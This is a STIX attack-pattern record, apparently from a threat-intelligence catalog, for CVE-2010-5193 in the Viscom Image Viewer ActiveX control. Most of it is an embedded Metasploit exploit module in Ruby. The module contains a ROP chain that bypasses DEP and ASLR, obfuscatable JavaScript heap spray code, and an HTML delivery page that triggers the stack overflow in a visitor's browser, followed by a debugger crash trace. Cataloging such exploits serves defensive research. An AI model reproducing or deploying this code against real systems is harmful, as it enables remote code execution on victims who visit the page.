{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c215e6a0-dbae-41bf-8d91-a534dfd5b848",
    "created": "2024-08-14T16:42:28.243294Z",
    "modified": "2024-08-14T16:42:28.243298Z",
    "name": "Viscom Image Viewer CP Pro 8.0/Gold 6.0 ActiveX Control",
    "description": " This module exploits a stack based buffer overflow in the Active control file ImageViewer2.OCX by passing an overly long argument to an insecure TifMergeMultiFiles() method. Exploitation results in code execution with the privileges of the user who browsed to the exploit page.  The victim will first be required to trust the publisher Viscom Software. This module has been designed to bypass DEP and ASLR under XP IE8, Vista and Win7 with Java support.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/imgeviewer_tifmergemultifiles.rb",
            "external_id": "imgeviewer_tifmergemultifiles.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-5193"
        },
        {
            "source_name": "reference",
            "url": "http://web.archive.org/web/20101204093821/http://secunia.com:80/advisories/42445"
        },
        {
            "source_name": "reference",
            "url": "http://xforce.iss.net/xforce/xfdb/63666"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Viscom Image Viewer CP Pro 8.0/Gold 6.0 ActiveX Control',\n      'Description'    => %q{\n          This module exploits a stack based buffer overflow in the Active control file\n        ImageViewer2.OCX by passing an overly long argument to an insecure TifMergeMultiFiles()\n        method. Exploitation results in code execution with the privileges of the user who\n        browsed to the exploit page.\n\n        The victim will first be required to trust the publisher Viscom Software.\n        This module has been designed to bypass DEP and ASLR under XP IE8, Vista and Win7\n        with Java support.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Dr_IDE', # Vulnerability discovery and original exploit\n          'TecR0c <roccogiovannicalvi[at]gmail.com>', # Metasploit module\n          'mr_me <steventhomasseeley[at]gmail.com>'  # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2010-5193' ],\n          [ 'OSVDB', '78102' ],\n          [ 'EDB', '15668' ],\n          [ 'URL', 'http://web.archive.org/web/20101204093821/http://secunia.com:80/advisories/42445' ],\n          [ 'URL', 'http://xforce.iss.net/xforce/xfdb/63666' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'DisablePayloadHandler' => false,\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1024,\n          'BadChars'      => \"\\x00\"\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', {} ],\n          [ 'Internet Explorer 6/7', {} ],\n          [ 'Internet Explorer 8 with JRE', {} ]\n        ],\n      'DisclosureDate' => '2010-03-03',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [ OptBool.new('OBFUSCATE', [false, 'Enable JavaScript Obfuscation', true]) ])\n  end\n\n  # Prevent module from being executed in autopwn\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def on_request_uri(cli, request)\n\n    # Set target manually or automatically\n    my_target = target\n    if my_target.name == 'Automatic'\n      agent = request.headers['User-Agent']\n      if agent =~ /NT 5\\.1/ and agent =~ /MSIE 6\\.0/\n        my_target = targets[1] # XP\n      elsif agent =~ /NT 5\\.1/ and agent =~ /MSIE 7\\.0/\n        my_target = targets[1] # XP\n      elsif agent =~ /NT 5\\.1/ and agent =~ /MSIE 8\\.0/\n        my_target = targets[2] # XP\n      elsif agent =~ /NT 6\\.0/ and agent =~ /MSIE 7\\.0/\n        my_target = targets[1] # Vista\n      elsif agent =~ /NT 6\\.0/ and agent =~ /MSIE 8\\.0/\n        my_target = targets[2] # Vista\n      elsif agent =~ /NT 6\\.1/ and agent =~ /MSIE 8\\.0/\n        my_target = targets[2] # Win7\n      end\n    end\n\n    sploit = rand_text_alpha(52)\n    pivot = [0x12AE0FE4].pack(\"V\") # Address to my code\n\n    if my_target.name =~ /JRE/\n\n      code =\n      [ # MSVCR71.dll - rop chain generated with mona.py\n        0x7C37653D, # POP EAX # POP EDI # POP ESI # POP EBX # POP EBP # RETN\n        0xFFFFFDFF, # Value to negate, will become 0x00000201 (dwSize)\n        0x7C347F98, # RETN (ROP NOP)\n        0x7C3415A2, # JMP [EAX]\n        0xFFFFFFFF, #\n        0x7C376402, # Skip 4 bytes\n        0x7C351E05, # NEG EAX # RETN\n        0x7C345255, # INC EBX # FPATAN # RETN\n        0x7C352174, # ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN\n        0x7C344F87, # POP EDX # RETN\n        0xFFFFFFC0, # Value to negate, will become 0x00000040\n        0x7C351EB1, # NEG EDX # RETN\n        0x7C34D201, # POP ECX # RETN\n        0x7C38B001, # &Writable location\n        0x7C347F97, # POP EAX # RETN\n        0x7C37A151, # Ptr to &VirtualProtect() - 0x0EF\n        0x7C378C81, # PUSHAD # ADD AL,0EF # RETN\n        0x7C345C30, # Ptr to 'push esp # ret\n      ].pack(\"V*\")\n\n      code << payload.encoded\n      sploit << [0x100EAD78].pack(\"V\") # POP ESP # RETN [IMAGEV~1.OCX]\n\n    else\n      code = payload.encoded\n      sploit << pivot\n    end\n\n    # Payload in JS format\n    code = Rex::Text.to_unescape(code)\n    randnop = rand_text_alpha(rand(100) + 1)\n    js_nops = Rex::Text.to_unescape(\"\\x0c\"*4)\n\n    sploit << [0x41414141].pack(\"V\") # Filler\n    sploit << [0x42424242].pack(\"V\") # Filler\n    sploit << [0x43434343].pack(\"V\") # Filler\n    sploit << pivot\n\n    # Randomize the javascript variable names\n    vname = rand_text_alpha(rand(100) + 1)\n\n    spray = <<-JS\n    var heap_lib = new heapLib.ie(0x20000);\n    var code = unescape(\"#{code}\");\n    var #{randnop} = \"#{js_nops}\";\n    var nops = unescape(#{randnop});\n\n    while (nops.length < 0x2000) nops += nops;\n    var offset = nops.substring(0, 0x800-0x20);\n    var shellcode = offset + code + nops.substring(0, 0x2000-offset.length-code.length);\n\n    while (shellcode.length < 0x40000) shellcode += shellcode;\n    var block = shellcode.substring(0, (0x7fb00-6)/2);\n\n    heap_lib.gc();\n\n    for (var i = 0; i < 0x200; i++) {\n    heap_lib.alloc(block);\n    }\n\n    var overflow = unescape(\"#{sploit}\");\n    var variable1 = \"VARIABLE\";\n\n    #{vname}.TIFMergeMultiFiles(variable1,variable1,overflow);\n    JS\n\n    # Use heaplib\n    js = heaplib(spray)\n\n    # Obfuscate on demand\n    if datastore['OBFUSCATE']\n      js = ::Rex::Exploitation::JSObfu.new(js)\n      js.obfuscate(memory_sensitive: true)\n    end\n\n    html = \"<html>\"\n    html << \"\\n<object classid='clsid:E589DA78-AD4C-4FC5-B6B9-9E47B110679E' id='#{vname}'></object>\"\n    html << \"\\n\\t<script>#{js}\\n\\t</script>\\n</html>\"\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, html)\n\n  end\n\nend\n=begin\n(460.1d4): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=0000fffd ebx=00000000 ecx=41414141 edx=6c440088 esi=00000010 edi=0204f5a8\neip=42424242 esp=0204f5b8 ebp=0204f644 iopl=0         nv up ei pl nz ac po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010212\n41414141 ??              ???\n\n0:005> dd @esp\n0203f594  41414141 41414141 41414141 41414141\n0203f5a4  41414141 41414141 41414141 41414141\n=end\n",
    "x_mitre_disclosure_date": "2010-03-03",
    "x_mitre_platforms": [
        "win'"
    ]
}